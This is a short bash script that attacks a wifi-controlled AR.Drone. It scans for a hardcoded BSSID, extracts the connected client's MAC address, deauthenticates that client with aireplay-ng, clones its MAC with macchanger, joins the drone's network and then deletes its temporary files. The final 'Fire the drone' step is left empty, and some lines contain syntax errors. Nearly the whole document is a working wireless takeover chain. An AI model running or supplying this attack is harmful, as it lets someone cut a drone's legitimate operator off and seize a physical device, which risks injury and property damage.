#!/bin/bash
card=iw dev | awk '$1=="Interface"{print $2}' | sed -e '1d'
message="Monitor mode enabled"
moncheck="$(iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk '{print $1}' | cut -b 5)"

#Checks whether card is in monitor mode.
    if [$moncheck == 1]; then
      echo "Monitor Enabled";
    else
       echo "Enable MONITOR MODE on card";
    fi
#Search for Drone
echo "Searching for Drone";
sudo timeout --foreground 5  airodump-ng wlan1 -c 4 --bssid 58:D7:59:31:DA:84 -w /tmp/out --output-format netxml

#Grab the client and assign it as victim
echo "Snatch";
victim="$(cat /tmp/out-01.kismet.netxml | grep client-mac | cut -c 16-32)"
host="$(cat /tmp/out-01.kismet.netxml | grep essid | sed -e "s/<essid cloaked=\"false\">/ /" -e "s/<\/essid>/ /" )"

#Deauthenticate the client
echo "Dauth";
aireplay-ng -0 30 -a 58:D7:59:31:DA:84 -c $victim  wlan1

#Spoof our mac_address to connect to the ardrone
echo "spoof";
sudo ifconfig wlan2 down && macchanger --mac $victim wlan2 && ifconfig wlan2 up

#Connect to the ardrone
echo "connect";
iwconfig wlan2 essid $host && dhclient
sleep 5s
iwconfig && ifconfig wlan2
#Fire the drone


#Remove all tmp data
echo "rm";
rm /tmp/out*

echo "See u Again"
